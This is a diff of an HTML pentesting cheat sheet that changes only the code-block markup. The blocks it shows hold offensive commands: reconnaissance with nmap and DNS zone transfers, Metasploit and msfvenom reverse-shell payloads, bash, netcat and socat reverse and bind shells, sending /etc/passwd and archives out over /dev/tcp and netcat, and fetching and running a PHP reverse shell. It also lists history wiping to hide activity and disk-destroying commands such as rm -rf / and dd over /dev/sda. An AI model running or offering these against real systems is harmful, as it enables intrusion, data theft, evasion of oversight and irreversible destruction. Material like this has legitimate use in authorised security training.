@@ -129,16 +129,15 @@
 
 <p><strong>DNS</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>﻿nslookup -type=any &lt;DOMAIN&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>﻿nslookup -type=any &lt;DOMAIN&gt;
 host -t axfr -l &lt;DOMAIN&gt; &lt;DNSSERVER&gt;
 dig -t mx &lt;DOMAIN&gt;
 dig -t any &lt;DOMAIN&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>Nmap</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># Service discovery
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Service discovery
 nmap -sV &lt;IP&gt;
 nmap -sV -O &lt;IP&gt;
 nmap -p 1-65535 -T4 -A -v -Pn &lt;IP&gt;
@@ -204,23 +203,20 @@ nmap -v A -6 &lt;IPv6&gt;
 
 # Save output
 nmap -oN &lt;FILE&gt; &lt;IP&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>MyIP</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>wget -qO- http://ipecho.net/plain; echo
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget -qO- http://ipecho.net/plain; echo
+</code></pre></div></div>
 
 <p><strong>SMB</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>smbclient -L &lt;IP&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -L &lt;IP&gt;
 rpcclient -U "" &lt;IP&gt;
 smbclient -U &lt;HOST&gt; -L &lt;IP&gt;
 /usr/bin/smbclient \\\\&lt;IP&gt;\\share &lt;HOST&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="exploitation">Exploitation</h3>
 
@@ -228,11 +224,10 @@ smbclient -U &lt;HOST&gt; -L &lt;IP&gt;
 
 <p><strong>Search Exploits</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>nikto -h &lt;http://IP&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h &lt;http://IP&gt;
 searchsploit
 sudo wpscan --url &lt;IP&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="metasploit">Metasploit</h3>
 
@@ -242,7 +237,7 @@ sudo wpscan --url &lt;IP&gt;
   <li>Windows</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/multi/handler 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; use exploit/multi/handler 
 msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
 payload =&gt; windows/meterpreter/reverse_tcp 
 msf exploit(handler) &gt; set LHOST &lt;IP&gt; 
@@ -250,29 +245,26 @@ lhost =&gt; &lt;IP&gt;
 msf exploit(handler) &gt; set LPORT 4444 
 lport =&gt; 4444 
 msf exploit(handler) &gt; run
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ul>
   <li>Linux</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf payload(linux/x86/meterpreter/reverse_tcp) &gt; use exploit/multi/handler 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf payload(linux/x86/meterpreter/reverse_tcp) &gt; use exploit/multi/handler 
 msf exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp 
 payload =&gt; linux/x86/meterpreter/reverse_tcp
 msf exploit(multi/handler) &gt; set LHOST &lt;IP&gt;
 LHOST =&gt; &lt;IP&gt;
 msf exploit(multi/handler) &gt; run
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>msfvenom</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f war &gt; shell.war
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f elf &gt; shell.elf
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="privilege-escalation">Privilege escalation</h3>
 
@@ -288,19 +280,17 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f elf
 <h3 id="reverse-shells">Reverse Shells</h3>
 
 <p><strong>Upgrade shell</strong></p>
-<div class="highlighter-rouge"><pre class="highlight"><code>python -c 'import pty; pty.spawn("/bin/bash");'
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import pty; pty.spawn("/bin/bash");'
+</code></pre></div></div>
 
 <p><strong>Listener</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>nc -lvp 4444
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvp 4444
+</code></pre></div></div>
 
 <p><strong>Target</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># Bash
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Bash
 bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1
 
 # Perl
@@ -324,56 +314,48 @@ nc -e /bin/sh &lt;IP&gt; 444
 
 # Socat
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;IP&gt;:4444 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="bind-shell">Bind Shell</h3>
 
 <p><strong>Target</strong></p>
-<div class="highlighter-rouge"><pre class="highlight"><code># Windows
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Windows
 nc -lvp 4444 -e cmd.exe
 
 # Linux
 nc -lvp 4444 -e /bin/sh
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>Attacker</strong></p>
-<div class="highlighter-rouge"><pre class="highlight"><code>nc &lt;IP&gt; 4444
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;IP&gt; 4444
+</code></pre></div></div>
 
 <h3 id="sending-files">Sending files</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>exec 3&lt;&gt;/dev/tcp/&lt;IP&gt;/4444 &amp;&amp; cat /etc/passwd&gt;&amp;3
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec 3&lt;&gt;/dev/tcp/&lt;IP&gt;/4444 &amp;&amp; cat /etc/passwd&gt;&amp;3
+</code></pre></div></div>
 
 <p><strong>With Netcat</strong></p>
 
 <p>Listener:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>netcat -l 4444 &gt; received_file
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netcat -l 4444 &gt; received_file
+</code></pre></div></div>
 
 <p>Target:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>netcat &lt;IP&gt; 4444 &lt; original_file
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netcat &lt;IP&gt; 4444 &lt; original_file
+</code></pre></div></div>
 
 <p>Listener:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>netcat -l 4444 | tar xzvf -
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netcat -l 4444 | tar xzvf -
+</code></pre></div></div>
 
 <p>Target:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>tar -czf - * | netcat &lt;IP&gt; 4444
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar -czf - * | netcat &lt;IP&gt; 4444
+</code></pre></div></div>
 
 <h3 id="file-upload-in-windows-with-powershell">File upload in Windows with PowerShell</h3>
 
@@ -383,9 +365,8 @@ nc -lvp 4444 -e /bin/sh
 
 <p><a href="https://github.com/JohnTroony/php-webshells">php-webshells</a></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;&amp; php -f /tmp/php_shell.php
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;&amp; php -f /tmp/php_shell.php
+</code></pre></div></div>
 
 <p><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></p>
 
@@ -395,30 +376,26 @@ nc -lvp 4444 -e /bin/sh
 
 <p><strong>Avoiding history</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>export HISTFILE=
-</code></pre>
-</div>
-<div class="highlighter-rouge"><pre class="highlight"><code>unset HISTFILE
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export HISTFILE=
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unset HISTFILE
+</code></pre></div></div>
 
 <p><strong>Clear history</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>rm -rf .bash_history 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm -rf .bash_history 
 touch .bash_history (invasive)
 history -c
 set +o history
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>Destroy</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>rm -rf / 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm -rf / 
 find / -type f -exec {} 
 mkfs.ext3 /dev/sda
 dd if=/dev/zero of=/dev/sda bs=1M
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="resources">Resources</h3>
 
